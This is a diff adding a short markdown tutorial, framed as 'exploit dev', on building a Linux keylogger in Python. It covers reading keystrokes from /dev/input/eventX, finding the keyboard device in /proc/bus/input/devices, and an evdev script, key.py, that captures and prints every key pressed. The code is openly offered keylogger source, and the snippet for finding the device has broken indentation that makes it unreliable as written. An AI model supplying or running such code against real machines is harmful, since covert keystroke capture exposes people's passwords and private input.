@@ -1,0 +1,64 @@
+EXPLOIT DEV AS KEYLOGGER
+=========================
+
+Keylogger in python:
+`````````````````````
+Lets understand how events are managed in the Linux operating system:
+```````````````````````````````````````````
+/dev : To manage all devices related info
+/dev/input: contains all the input devices, which, in most cases, means the keyboard and mouse.
+
+# ls -la /dev/input/
+
+ALL THE EVENT FILE ARE USED TO STORE KEYSTROKES:
+`````````````````````````````````````````````````
+On terminal 1:
+``````````````
+# cat /dev/input/event0
+
+On terminal 2:
+```````````````
+Press any key & check terminal 1 ;)
+
+
+NOTE: In order to determinate which eventX is the correct one, we will have a look at /proc/bus/input/devices:
+
+# cat /proc/bus/input/devices
+
+This file describes the devices connected to the machine. find the keyboard device section, focus on the line "H: Handlers" to catch the eventX id.
+
+
+To find the correct event:
+``````````````````````````
+f = open("/proc/bus/input/devices", "r")
+lines = f.readlines()
+pattern = re.compile("Handlers|EV=")
+handlers = list(filter(pattern.search, lines))
+
+       pattern = re.compile("EV=120013")
+
+       for idx, elt in enumerate(handlers):
+           if pattern.search(elt):
+               line = handlers[idx - 1]
+
+       pattern = re.compile("event[0-9]")
+       infile_path = "/dev/input/" + pattern.search(line).group(0)
+	print(infile_path)
+
+
+
+
+Keylogger:
+``````````
+# pip3 install evdev
+
+# cat key.py 
+
+#!/usr/bin/python3
+from evdev import *
+dev = InputDevice('/dev/input/event0')
+
+for event in dev.read_loop():
+    if event.type == ecodes.EV_KEY:
+        print(categorize(event))
+
